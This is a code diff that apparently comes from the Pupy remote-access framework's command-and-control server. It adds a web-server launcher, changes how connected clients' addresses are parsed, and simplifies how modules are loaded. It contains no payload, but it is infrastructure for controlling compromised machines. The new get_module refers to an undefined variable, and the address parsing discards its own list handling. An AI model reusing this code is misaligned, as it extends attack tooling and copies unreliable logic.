@@ -34,6 +34,7 @@ from network.lib.base import chain_transports
 from network.lib.transports.httpwrap import PupyHTTPWrapperServer
 from network.lib.base_launcher import LauncherError
 from network.lib.igd import IGDClient, UPNPError
+from .PupyWeb import PupyWebServer
 from os import path
 from shutil import copyfile
 from itertools import count, ifilterfalse
@@ -53,6 +54,7 @@ class PupyServer(threading.Thread):
         self.server = None
         self.authenticator = None
         self.httpd = None
+        self.pupweb = None
         self.clients = []
         self.jobs = {}
         self.jobs_id = 1
@@ -117,6 +119,12 @@ class PupyServer(threading.Thread):
                 )
             except Exception, e:
                 logging.error('DnsCNC failed: {}'.format(e))
+
+    def start_webserver(self):
+        if self.pupweb:
+            raise RuntimeError("Pupy Web Server is already started !")
+        self.pupweb=PupyWebServer(self, self.config)
+        self.pupweb.start()
 
 
     def create_id(self):
@@ -186,11 +194,18 @@ class PupyServer(threading.Thread):
                     "native": bool(conn.get_infos("native")),
                     "sid": conn.get_infos("sid") or '',
                 }
+            address=conn._conn._config['connid']
+            try:
+                if type(address) is list:
+                    address=address[0]
+                address=conn._conn._config['connid'].rsplit(':',1)[0]
+            except:
+                address=str(address)
 
             client_info.update({
                 "id": client_id,
                 "conn" : conn,
-                "address" : conn._conn._config['connid'].rsplit(':',1)[0],
+                "address" : address
             })
 
             client_info.update(conn.namespace["get_uuid"]())
@@ -332,20 +347,16 @@ class PupyServer(threading.Thread):
         return l
 
     def get_module(self, name):
-        script_found=False
-        for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__ + ['modules']):
-            if module_name==name:
-                script_found=True
-                module=loader.find_module(module_name).load_module(module_name)
-                class_name=None
-                if hasattr(module,"__class_name__"):
-                    class_name=module.__class_name__
-                    if not hasattr(module,class_name):
-                        logging.error("script %s has a class_name=\"%s\" global variable defined but this class does not exists in the script !"%(module_name,class_name))
-                if not class_name:
-                    #TODO automatically search the class name in the file
-                    exit("Error : no __class_name__ for module %s"%module)
-                return getattr(module,class_name)
+        module=pkgutil.get_loader("modules."+name).load_module(name)
+        class_name=None
+        if hasattr(module,"__class_name__"):
+            class_name=module.__class_name__
+            if not hasattr(module,class_name):
+                logging.error("script %s has a class_name=\"%s\" global variable defined but this class does not exists in the script !"%(module_name,class_name))
+        if not class_name:
+            #TODO automatically search the class name in the file
+            exit("Error : no __class_name__ for module %s"%module)
+        return getattr(module,class_name)
 
     def module_parse_args(self, module_name, args):
         """ This method is used by the PupyCmd class to verify validity of arguments passed to a specific module """
